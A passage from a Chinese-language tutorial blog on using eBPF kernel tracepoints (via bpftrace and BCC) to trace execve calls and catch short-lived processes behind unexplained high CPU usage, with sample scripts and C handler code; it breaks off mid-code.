title="如何利用内核跟踪点排查短时进程问题？"></a>如何利用内核跟踪点排查短时进程问题？</h3><p>在排查系统 CPU 使用率高的问题时，我想你很可能遇到过这样的困惑：明明通过  top  命令发现系统的 CPU 使用率（特别是用户 CPU 使用率）特别高，但通过  ps、pidstat  等工具都找不出 CPU 使用率高的进程。这是什么原因导致的呢？你可以先停下来思考一下，再继续下面的内容。</p><p>你想到可能的原因了吗？在我看来，一般情况下，这类问题很可能是以下两个原因导致的：</p><ul><li>第一，应用程序里面直接调用其他二进制程序，并且这些程序的运行时间很短，通过  top  工具不容易发现；</li><li>第二，应用程序自身在不停地崩溃重启中，且重启间隔较短，启动过程中资源的初始化导致了高 CPU 使用率。</li></ul><p>使用  <code>top</code>、<code>ps</code>  等性能工具很难发现这类短时进程，这是因为它们都只会按照给定的时间间隔采样，而不会实时采集到所有新创建的进程。那要如何才能采集到所有的短时进程呢？你肯定已经想到了，那就是<strong>利用 eBPF 的事件触发机制，跟踪内核每次新创建的进程</strong>，这样就可以揪出这些短时进程。</p><p>要跟踪内核新创建的进程，首先得找到要跟踪的内核函数或跟踪点。如果你了解过 Linux 编程中创建进程的过程，我想你已经知道了，创建一个新进程通常需要调用  <code>fork()</code>  和  <code>execve()</code>  这两个标准函数，它们的调用过程如下图所示：</p><img src="/2023/08/06/eBPF-%E5%86%85%E6%A0%B8%E8%B7%9F%E8%B8%AA/newProcess.png" class=""><p>因为我们要关心的主要是新创建进程的基本信息，而像进程名称和参数等信息都在  <code>execve()</code>  的参数里，所以我们就要找出  <code>execve()</code>  所对应的内核函数或跟踪点。</p><p>借助刚才提到的  <code>bpftrace</code>  工具，你可以执行下面的命令，查询所有包含  <code>execve</code>  关键字的跟踪点：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> bpftrace <span class="token parameter variable">-l</span> <span class="token string">'*execve*'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>命令执行后，你会得到如下的输出内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kprobe:__ia32_compat_sys_execvekprobe:__ia32_compat_sys_execveatkprobe:__ia32_sys_execvekprobe:__ia32_sys_execveatkprobe:__x32_compat_sys_execvekprobe:__x32_compat_sys_execveatkprobe:__x64_sys_execvekprobe:__x64_sys_execveatkprobe:audit_log_execve_infokprobe:bprm_execvekprobe:do_execveat_common.isra.0kprobe:kernel_execvetracepoint:syscalls:sys_enter_execvetracepoint:syscalls:sys_enter_execveattracepoint:syscalls:sys_exit_execvetracepoint:syscalls:sys_exit_execveat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从输出中，你可以发现这些函数可以分为内核插桩（kprobe）和跟踪点（tracepoint）两类。在上一小节中我曾提到，内核插桩属于不稳定接口，而跟踪点则是稳定接口。因而，<strong>在内核插桩和跟踪点两者都可用的情况下，应该选择更稳定的跟踪点，以保证 eBPF 程序的可移植性（即在不同版本的内核中都可以正常执行）</strong>。</p><p>排除掉  kprobe  类型之后，剩下的  <code>tracepoint:syscalls:sys_enter_execve</code>、<code>tracepoint:syscalls:sys_enter_execveat</code>、<code>tracepoint:syscalls:sys_exit_execve</code>  以及  <code>tracepoint:syscalls:sys_exit_execveat</code>  就是我们想要的 eBPF 跟踪点。其中，<code>sys_enter_</code>  和  <code>sys_exit_</code>  分别表示在系统调用的入口和出口执行。</p><p>只有跟踪点的列表还不够，因为我们还想知道具体启动的进程名称、命令行选项以及返回值，而这些也都可以通过 bpftrace 来查询。在命令行中执行下面的命令，即可查询：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查询sys_enter_execve入口参数</span>$ <span class="token function">sudo</span> bpftrace <span class="token parameter variable">-lv</span> tracepoint:syscalls:sys_enter_execvetracepoint:syscalls:sys_enter_execve    int __syscall_nr    const char * filename    const char *const * argv    const char *const * envp<span class="token comment"># 查询sys_exit_execve返回值</span>$ <span class="token function">sudo</span> bpftrace <span class="token parameter variable">-lv</span> tracepoint:syscalls:sys_exit_execvetracepoint:syscalls:sys_exit_execve    int __syscall_nr    long ret<span class="token comment"># 查询sys_enter_execveat入口参数</span>$ <span class="token function">sudo</span> bpftrace <span class="token parameter variable">-lv</span> tracepoint:syscalls:sys_enter_execveattracepoint:syscalls:sys_enter_execveat    int __syscall_nr    int fd    const char * filename    const char *const * argv    const char *const * envp    int flags<span class="token comment"># 查询sys_exit_execveat返回值</span>$ <span class="token function">sudo</span> bpftrace <span class="token parameter variable">-lv</span> tracepoint:syscalls:sys_exit_execveattracepoint:syscalls:sys_exit_execveat    int __syscall_nr    long ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从输出中可以看到，<code>sys_enter_execveat()</code>  比  <code>sys_enter_execve()</code>  多了两个参数，而文件名  <code>filename</code>、命令行选项  <code>argv</code>  以及返回值  ret 的定义都是一样的。</p><p>到这里，我带你使用 bpftrace 查询到了 execve 相关的跟踪点，以及这些跟踪点的具体格式。接下来，为了帮你全方位掌握 eBPF 程序的开发过程，我会以 bpftrace、BCC 和 libbpf 这三种方式为例，带你开发一个跟踪短时进程的 eBPF 程序。这三种方式各有优缺点，在实际的生产环境中都有大量的应用：</p><ul><li><strong>bpftrace 通常用在快速排查和定位系统上，它支持用单行脚本的方式来快速开发并执行一个 eBPF 程序</strong>。不过，bpftrace 的功能有限，不支持特别复杂的 eBPF 程序，也依赖于 BCC 和 LLVM 动态编译执行。</li><li><strong>BCC 通常用在开发复杂的 eBPF 程序中，其内置的各种小工具也是目前应用最为广泛的 eBPF 小程序</strong>。不过，BCC 也不是完美的，它依赖于 LLVM 和内核头文件才可以动态编译和加载 eBPF 程序。</li><li><strong>libbpf 是从内核中抽离出来的标准库，用它开发的 eBPF 程序可以直接分发执行，这样就不需要每台机器都安装 LLVM 和内核头文件了</strong>。不过，它要求内核开启 BTF 特性，需要非常新的发行版才会默认开启（如 RHEL 8.2+ 和 Ubuntu 20.10+ 等）。</li></ul><p>在实际应用中，你可以根据你的内核版本、内核配置、eBPF 程序复杂度，以及是否允许安装内核头文件和 LLVM 等编译工具等，来选择最合适的方案。</p><h3 id="bpftrace-方法"><a href="#bpftrace-方法" class="headerlink" title="bpftrace 方法"></a>bpftrace 方法</h3><p>这一讲我们先来看看，如何使用 bpftrace 来跟踪短时进程。</p><p>由于 <code>execve()</code> 和 <code>execveat()</code> 这两个系统调用的入口参数文件名 <code>filename</code> 和命令行选项 <code>argv</code> ，以及返回值  ret  的定义都是一样的，因而我们可以把这两个跟踪点放到一起来处理。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> bpftrace <span class="token parameter variable">-e</span> <span class="token string">'tracepoint:syscalls:sys_enter_execve,tracepoint:syscalls:sys_enter_execveat &#123; printf("%-6d %-8s", pid, comm); join(args->argv);&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/08/06/eBPF-%E5%86%85%E6%A0%B8%E8%B7%9F%E8%B8%AA/bpftraceTwoProcess.png" class=""><p>这个命令中的具体内容含义如下：</p><ul><li><code>bpftrace -e</code>  表示直接从后面的字符串参数中读入 bpftrace 程序（除此之外，它还支持从文件中读入 bpftrace 程序）；</li><li><code>tracepoint:syscalls:sys_enter_execve,tracepoint:syscalls:sys_enter_execveat</code>  表示用逗号分隔的多个跟踪点，其后的中括号表示跟踪点的处理函数；</li><li><code>printf()</code> 表示向终端中打印字符串，其用法类似于 C 语言中的 <code>printf()</code> 函数；</li><li><code>pid</code> 和 <code>comm</code> 是 bpftrace 内置的变量，分别表示进程 PID 和进程名称（你可以在其官方文档中找到其他的内置变量）；</li><li><code>join(args-&gt;argv)</code> 表示把字符串数组格式的参数用空格拼接起来，再打印到终端中。对于跟踪点来说，你可以使用  <code>args-&gt;参数名</code>  的方式直接读取参数（比如这里的 <code>args-&gt;argv</code> 就是读取系统调用中的 <code>argv</code> 参数）。</li></ul><p>在另一个终端中执行 ls 命令，然后你会在第一个终端中看到如下的输出：</p><img src="/2023/08/06/eBPF-%E5%86%85%E6%A0%B8%E8%B7%9F%E8%B8%AA/lsCommand.png" class=""><p>一个最简单的思路就是在系统调用的入口把参数保存到 BPF 映射中，然后再在系统调用出口获取返回值后一起输出。比如，你可以尝试执行下面的命令，把新进程的参数存入哈希映射中：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 其中，tid表示线程ID，@execs[tid]表示创建一个哈希映射</span><span class="token function">sudo</span> bpftrace <span class="token parameter variable">-e</span> <span class="token string">'tracepoint:syscalls:sys_enter_execve,tracepoint:syscalls:sys_enter_execveat &#123;@execs[tid] = join(args->argv);&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>很遗憾，这条命令并不能正常运行。根据下面的错误信息，你可以发现，<code>join()</code> 这个内置函数没有返回字符串，不能用来赋值：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">stdin:1:90-106: ERROR: join<span class="token punctuation">(</span><span class="token punctuation">)</span> should not be used <span class="token keyword">in</span> an assignment or as a map keytracepoint:syscalls:sys_enter_execve,tracepoint:syscalls:sys_enter_execveat <span class="token punctuation">&#123;</span>@execs<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> join<span class="token punctuation">(</span>args-<span class="token operator">></span>argv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>实际上，在 bpftrace 的 GitHub 页面上，已经有其他用户汇报了同样的问题，并且到现在还是没有解决。</p><p>bpftrace 本身并不适用于所有的 eBPF 应用。如果是复杂的应用，我还是推荐使用 BCC 或者 libbpf 开发。</p><p>再举一用例，在解决短时进程引发的性能问题时，找出短时进程才是最重要的。至于短时进程的执行结果，我们一般可以通过日志看到详细的运行过程。</p><p>不过，这个跟踪程序还是有一些比较大的限制，比如：</p><ul><li>没有输出时间戳，这样去大量日志里面定位问题就比较困难；</li><li>没有父进程 PID，还需要一些额外的工具或经验，才可以找出父进程。</li></ul><p>那么，这些问题该如何解决呢？</p><pre class="line-numbers language-bt" data-language="bt"><code class="language-bt">---------------- execsnoop.bt -----------------#!&#x2F;usr&#x2F;bin&#x2F;bpftrace#include &lt;linux&#x2F;sched.h&gt;BEGIN&#123;    printf(&quot;%-9s %-6s %-6s %-16s %s\n&quot;, &quot;TIME&quot;, &quot;PID&quot;, &quot;PPID&quot;, &quot;COMM&quot;, &quot;ARGS&quot;)&#125;tracepoint:syscalls:sys_enter_execve,tracepoint:syscalls:sys_enter_execveat&#123;    $task &#x3D; (struct task_struct *)curtask;    time(&quot;%H:%M:%S  &quot;);    printf(&quot;%-6d %-6d %-16s&quot;, pid, $task-&gt;parent-&gt;tgid, comm);    join(args-&gt;argv);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="bpftrace-小结"><a href="#bpftrace-小结" class="headerlink" title="bpftrace 小结"></a>bpftrace 小结</h3><p>今天，我带你梳理了查询 eBPF 跟踪点的常用方法，并以短时进程的跟踪为例，通过 bpftrace 实现了短时进程的跟踪程序。</p><p>在跟踪内核时，你要记得，所有的内核跟踪都是被内核函数、内核跟踪点或性能事件等事件源触发后才执行的。所以，在跟踪内核之前，我们就需要通过调试信息、perf、bpftrace 等，找到这些事件源，然后再利用 eBPF 提供的强大功能去跟踪这些事件的执行过程。</p><p>bpftrace 是一个使用最为简单的 eBPF 工具，因此在初学 eBPF 时，建议你可以从它开始。bpftrace 提供了一个简单的脚本语言，只需要简单的几条脚本就可以实现很丰富的 eBPF 程序。它通常用在快速排查和定位系统上，并支持用单行脚本的方式来快速开发并执行一个 eBPF 程序。</p><h2 id="BCC-开发内核追踪程序"><a href="#BCC-开发内核追踪程序" class="headerlink" title="BCC 开发内核追踪程序"></a>BCC 开发内核追踪程序</h2><h3 id="BCC-方法"><a href="#BCC-方法" class="headerlink" title="BCC 方法"></a>BCC 方法</h3><p>我们先来看看如何使用 BCC 来开发上一讲中短时进程的跟踪程序。这里先说明下，由于  <code>execveat</code>  的处理逻辑同  <code>execve</code>  基本相同，限于篇幅的长度，接下来的 BCC 和 libbpf 程序都以  <code>execve</code>  为例。</p><p>这里先回顾一下之前的内容，使用 BCC 开发 eBPF 程序包含两部分</p><ul><li>第一部分是用 C 语言开发的 eBPF 程序。在 eBPF 程序中，你可以利用 BCC 提供的库函数和宏定义简化你的处理逻辑。</li><li>第二部分是用 Python 语言开发的前端界面，其中包含 eBPF 程序加载、挂载到内核函数和跟踪点，以及通过 BPF 映射获取和打印执行结果等部分。在前端程序中，你同样可以利用 BCC 库来访问 BPF 映射。</li></ul><h3 id="数据结构定义"><a href="#数据结构定义" class="headerlink" title="数据结构定义"></a>数据结构定义</h3><p>我们先看第一部分。为了在系统调用入口跟踪点和出口跟踪点间共享进程信息等数据，我们可以定义一个哈希映射（比如命名为  <code>tasks</code>）；同样地，因为我们想要在用户空间实时获取跟踪信息，这就需要一个性能事件映射。对于这两种映射的创建步骤，BCC 已经提供了非常方便的宏定义，你可以直接使用。</p><p>比如，你可以用下面的方式来创建这两个映射：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">data_t</span> <span class="token punctuation">&#123;</span>    u32 pid<span class="token punctuation">;</span>    <span class="token keyword">char</span> comm<span class="token punctuation">[</span>TASK_COMM_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> retval<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> args_size<span class="token punctuation">;</span>    <span class="token keyword">char</span> argv<span class="token punctuation">[</span>FULL_MAX_ARGS_ARR<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">BPF_PERF_OUTPUT</span><span class="token punctuation">(</span>events<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">BPF_HASH</span><span class="token punctuation">(</span>tasks<span class="token punctuation">,</span> u32<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">data_t</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码中指令的具体作用如下：</p><ul><li><code>struct data_t</code>  定义了一个包含进程基本信息的数据结构，它将用在哈希映射的值中（其中的参数大小  <code>args_size</code>  会在读取参数内容的时候用到）；</li><li><code>BPF_PERF_OUTPUT(events)</code>  定义了一个性能事件映射；</li><li><code>BPF_HASH(tasks, u32, struct data_t)</code>  定义了一个哈希映射，其键为 32 位的进程 PID，而值则是进程基本信息  <code>data_t</code>。</li></ul><p>两个映射定义好之后，接下来就是<strong>定义跟踪点的处理函数</strong>。在 BCC 中，你可以通过  <code>TRACEPOINT_PROBE(category, event)</code>  来定义一个跟踪点处理函数。BCC 会将所有的参数放入  <code>args</code>  这个变量中，这样使用  <code>args-&gt;&lt;参数名&gt;</code>  就可以访问跟踪点的参数值。</p><p>对我们要跟踪的短时进程问题来说，也就是下面这两个跟踪点：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 定义sys_enter_execve跟踪点处理函数.</span><span class="token function">TRACEPOINT_PROBE</span><span class="token punctuation">(</span>syscalls<span class="token punctuation">,</span> sys_enter_execve<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//待添加处理逻辑</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义sys_exit_execve跟踪点处理函数.</span><span class="token function">TRACEPOINT_PROBE</span><span class="token punctuation">(</span>syscalls<span class="token punctuation">,</span> sys_exit_execve<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//待添加处理逻辑</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="入口跟踪点处理"><a href="#入口跟踪点处理" class="headerlink" title="入口跟踪点处理"></a>入口跟踪点处理</h3><p>对于入口跟踪点  <code>sys_enter_execve</code>  的处理，还是按照上一讲中 bpftrace 的逻辑，先获取进程的 PID、进程名称和参数列表之后，再存入刚刚定义的哈希映射中。</p><p>其中，进程 PID 和进程名称都比较容易获取。如下面的代码所示，你可以调用  <code>bpf_get_current_pid_tgid()</code>  查询进程 PID，调用  <code>bpf_get_current_comm()</code>  读取进程名称：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 获取进程PID和进程名称</span><span class="token keyword">struct</span> <span class="token class-name">data_t</span> data <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>u32 pid <span class="token operator">=</span> <span class="token function">bpf_get_current_pid_tgid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 取低32位为进程PID</span>data<span class="token punctuation">.</span>pid <span class="token operator">=</span> pid<span class="token punctuation">;</span><span class="token function">bpf_get_current_comm</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data<span class="token punctuation">.</span>comm<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>comm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而命令行参数的获取就没那么容易了。因为 BCC 把所有参数都放到了  <code>args</code>  中，你可以使用  <code>args-&gt;argv</code>  来访问参数列表：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>args<span class="token operator">-></span>argv<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意，<code>argv</code>  是一个用户空间的字符串数组（指针数组），这就需要调用  <code>bpf_probe_read</code> 系列的辅助函数，去这些指针中读取数据。并且，字符串的数量（即参数的个数）和每个字符串的长度（即每个参数的长度）都是未知的，由于 eBPF 栈大小只有 512 字节，如果想要把它们读入一个临时的字符数组中，必须要保证每次读取的内容不超过栈的大小。这类问题有很多种不同的处理方法，其中一个比较简单的方式就是<strong>把多余的参数截断，使用<code>...</code>代替过长的参数</strong>。一般来说，知道了进程的名称和前几个参数，对调试和排错来说就足够了。</p><p>你可以定义最大读取的参数个数和参数长度，然后在哈希映射的值中定义一个字符数组，代码如下所示：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 定义参数长度和参数个数常量</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ARGSIZE</span> <span class="token expression"><span class="token number">64</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">TOTAL_MAX_ARGS</span> <span class="token expression"><span class="token number">5</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">FULL_MAX_ARGS_ARR</span> <span class="token expression"><span class="token punctuation">(</span>TOTAL_MAX_ARGS <span class="token operator">*</span> ARGSIZE<span class="token punctuation">)</span></span></span><span class="token keyword">struct</span> <span class="token class-name">data_t</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">char</span> argv<span class="token punctuation">[</span>FULL_MAX_ARGS_ARR<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有了字符数组，接下来再定义一个辅助函数，从参数数组中读取字符串参数（限定最长  <code>ARGSIZE</code>）：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 从用户空间读取字符串</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">__bpf_read_arg_str</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">data_t</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token operator">-></span>args_size <span class="token operator">></span> LAST_ARG<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token function">bpf_probe_read_user_str</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data<span class="token operator">-></span>argv<span class="token punctuation">[</span>data<span class="token operator">-></span>args_size<span class="token punctuation">]</span><span class="token punctuation">,</span> ARGSIZE<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">></span> ARGSIZE <span class="token operator">||</span> ret <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// increase the args size. the first tailing '\0' is not counted and hence it</span>    <span class="token comment">// would be overwritten by the next call.</span>    data<span class="token operator">-></span>args_size <span class="token operator">+=</span> <span class="token punctuation">(</span>ret <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个函数中，有几点需要你注意：</p><ul><li><code>bpf_probe_read_user_str()</code>  返回的是包含字符串结束符 <code>\0</code> 的长度。为了拼接所有的字符串，在计算已读取参数长度的时候，需要把 <code>\0</code> 排除在外。</li><li><code>&amp;data-&gt;argv[data-&gt;args_size]</code>  用来获取要存放参数的位置指针，这是为了把多个参数拼接到一起。</li><li>在调用 <code>bpf_probe_read_user_str()</code> 前后，需要对指针位置和返回值进行校验，这可以帮助 eBPF 验证器获取指针读写的边界（如果你感兴趣，可以参考<a class="link"   href="https://sysdig.com/blog/the-art-of-writing-ebpf-programs-a-primer/" >这篇文章<i class="fas fa-external-link-alt"></i></a>，了解更多的内存访问验证细节）。</li><li>在调用 <code>bpf_probe_read_user_str()</code> 前后，需要对指针位置和返回值进行校验，这可以帮助 eBPF 验证器获取指针读写的边界（如果你感兴趣，可以参考这篇文章，了解更多的内存访问验证细节）。</li></ul><p>有了这个辅助函数之后，因为 eBPF 在老版本内核中并不支持循环（有界循环在 5.3 之后才支持），要访问字符串数组，还需要一个小技巧：使用 <code>#pragma unroll</code> 告诉编译器，把源码中的循环自动展开。这就避免了最终的字节码中包含循环。</p><p>完整的处理函数如下所示（具体的每一步我都加了详细的注释，你可以参考注释来加深理解）：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 引入内核头文件</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;uapi/linux/ptrace.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/fs.h></span></span><span class="token comment">// 定义sys_enter_execve跟踪点处理函数.</span><span class="token function">TRACEPOINT_PROBE</span><span class="token punctuation">(</span>syscalls<span class="token punctuation">,</span> sys_enter_execve<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 变量定义</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>args<span class="token operator">-></span>argv<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 获取进程PID和进程名称</span>    <span class="token keyword">struct</span> <span class="token class-name">data_t</span> data <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    u32 pid <span class="token operator">=</span> <span class="token function">bpf_get_current_pid_tgid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    data<span class="token punctuation">.</span>pid <span class="token operator">=</span> pid<span class="token punctuation">;</span>    <span class="token function">bpf_get_current_comm</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data<span class="token punctuation">.</span>comm<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>comm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 获取第一个参数（即可执行文件的名字）</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__bpf_read_arg_str</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">goto</span> out<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 获取其他参数（限定最多5个）</span>    <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">unrollfor</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> TOTAL_MAX_ARGS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></span></span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__bpf_read_arg_str</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">goto</span> out<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> out<span class="token operator">:</span>    <span class="token comment">// 存储到哈希映射中</span>    tasks<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pid<span class="token punctuation">,</span> <span class="token operator">&amp;</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意，为了获取内核数据结构的定义，在文件的开头需要引入相关的内核头文件。此外，读取参数完成之后，不要忘记调用 <code>tasks.update()</code> 把进程的基本信息存储到哈希映射中。因为返回值需要等到出口跟踪点时才可以获取，这儿只需要更新哈希映射就可以了，不需要把进程信息提交到性能事件映射中去。</p><h3 id="出口跟踪点处理"><a href="#出口跟踪点处理" class="headerlink" title="出口跟踪点处理"></a>出口跟踪点处理</h3><p>入口跟踪点  <code>sys_enter_execve</code>  处理好之后，我们再来看看出口跟踪点  <code>sys_exit_execve</code>  该如何处理。</p><p>由于进程的基本信息已经保存在了哈希映射中，所以出口事件的处理可以分为查询进程基本信息、填充返回值、最后再提交到性能事件映射这三个步骤。具体代码如下所示：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 定义sys_exit_execve跟踪点处理函数.</span><span class="token 